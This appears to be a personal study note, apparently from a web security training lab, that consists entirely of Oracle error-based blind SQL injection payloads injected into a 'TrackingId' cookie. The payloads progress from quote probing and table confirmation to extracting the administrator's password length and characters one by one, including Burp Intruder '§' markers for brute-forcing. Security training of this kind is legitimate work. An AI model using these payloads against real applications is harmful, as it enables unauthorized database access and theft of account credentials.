---
title: Blind SQL Injection
updated: 2023-11-06 04:01:19Z
created: 2023-11-05 12:09:35Z
latitude: -33.85985000
longitude: 151.20901000
altitude: 0.0000
---

`TrackingId=xyz'`  
`TrackingId=xyz''`  
`TrackingId=xyz'||(SELECT '')||'`  
`TrackingId=xyz'||(SELECT '' FROM dual)||'`  
`TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`  
`TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`  
`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
`TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
`TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
`TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`